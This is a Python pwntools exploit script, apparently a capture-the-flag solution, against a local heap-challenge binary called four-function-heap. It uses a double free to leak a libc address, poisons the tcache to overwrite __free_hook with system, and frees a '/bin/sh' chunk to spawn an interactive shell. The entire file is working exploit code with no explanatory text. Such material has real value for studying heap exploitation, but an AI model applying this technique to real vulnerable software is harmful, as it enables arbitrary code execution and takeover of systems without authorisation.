from pwn import *

e = ELF("./bin/four-function-heap")
libc = ELF("./bin/libc.so.6")

p = process(e.path)

def alloc(idx, size, data="AAAA"):
  p.sendline("1")
  p.sendlineafter(":", str(idx))
  p.sendlineafter(":", str(size))
  p.sendafter(":", data)

  p.recvuntil(":")

def free(idx):
  p.sendline("2")
  p.sendlineafter(":", str(idx))

  p.recvuntil(":")

def show(idx):
  p.sendline("3")
  p.sendlineafter(": ", str(idx))

p.recvuntil(":")

alloc(0, 0x80)
free(0)
alloc(0, 0x20)
alloc(0, 0x80)
free(0)
free(0)
alloc(0, 0x80, "\x60")
alloc(0, 0x80, "\x60")
alloc(0, 0x80, "\x60")
free(0)
show(0)

leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - 0x7f61e1f61ca0 + 0x00007f61e1b76000
print("{:#x}".format(leak))

alloc(0, 0x20, p64(leak + libc.symbols["__free_hook"] - 8))
alloc(0, 0x80)
alloc(0, 0x80, "/bin/sh\x00" + p64(leak + libc.symbols["system"]))
free(0)



p.interactive()
